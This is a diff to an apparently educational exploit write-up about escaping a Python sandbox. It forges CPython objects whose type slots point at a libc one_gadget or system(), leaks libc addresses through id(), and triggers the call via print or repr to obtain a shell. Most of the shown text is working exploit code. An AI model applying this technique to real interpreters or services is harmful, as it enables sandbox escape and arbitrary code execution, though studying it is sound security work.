@@ -69,7 +69,7 @@ PyTypeObject *ob_type;
 ```
 
 We can define a field in order to execute what we want.
-An interesting one is `tp_str`, why? Let's look at the function `PyObject_Str`:
+An interesting one is `tp_repr`, why? Let's look at the function `PyObject_Str`:
 
 ```c++
 0x5555556c9f20 <PyObject_Str+320> call   r11
@@ -77,7 +77,7 @@ An interesting one is `tp_str`, why? Let's look at the function `PyObject_Str`:
 
 If we're able to control the value of `r11`, we can jump to any address we want!
 
-`tp_str` is going to be called each time we pass an object to `print` or `repr`
+`tp_repr` is going to be called each time we pass an object to `print` or `repr`
 
 Now, we just need to create a fake object with our fake type.
 Objects in python are defined as follow:
@@ -114,7 +114,7 @@ libc.address = id(0) + zero_libc_offset
 print(f"[ + ] libc base address: {hex(libc.address)}")
 
 one_gadget = libc.address + 0xebc88 # run one_gadget libc.so.6
-fake_type = flat(one_gadget)*16
+fake_type = flat(one_gadget)*14
 
 fake_object = flat(
     0xdeadbeef, # ref_count
@@ -125,7 +125,7 @@ print(f"[ + ] Fake object id: {hex(id(fake_object))}")
 
 b = PyObj_FromPtr(id(fake_object) + 0x20)
 
-print(b) # Here we trigger tp_str
+print(b) # Here we trigger tp_repr
 ```
 
 Result:
@@ -182,7 +182,7 @@ libc.address = id(0) + zero_libc_offset
 print(f"[ + ] libc base address: {hex(libc.address)}")
 
 one_gadget = libc.address + 0xebc88
-fake_type = flat(libc.sym['system'])*16
+fake_type = flat(libc.sym['system'])*14
 
 fake_object = flat(
     b'-bin/sh\x00', # ref_count
@@ -193,7 +193,7 @@ print(f"[ + ] Fake object id: {hex(id(fake_object))}")
 
 b = PyObj_FromPtr(id(fake_object) + 0x20)
 
-print(b) # Here we trigger tp_str
+print(b) # Here we trigger tp_repr
 ```
 
 And... We got a shell!
@@ -215,7 +215,7 @@ elf.address = id(str) - str_base_offset
 
 print(f"[ + ] elf base address: {hex(elf.address)}")
 
-fake_type_1 = flat(elf.sym['system'])*16
+fake_type_1 = flat(elf.sym['system'])*14
 
 fake_object_1 = flat(
     b'-bin/sh\x00', # ref_count
@@ -231,7 +231,7 @@ repr(b)
 ```
 
 ## Note
-Since we there are other fields before `tp_str`, we can trigger the call with something like this:
+Since we there are other fields before `tp_repr`, we can trigger the call with something like this:
 
 ```py
 b.a
@@ -264,7 +264,7 @@ libc.address = id(0) + zero_system_offset - libc.sym["system"] # The offset will
 print(f"[ + ] libc base address: {hex(libc.address)}")
 
 one_gadget = libc.address + 0xebc81
-fake_type = flat(one_gadget)*16
+fake_type = flat(one_gadget)*14
 
 fake_object = flat(
     0, # ref_count
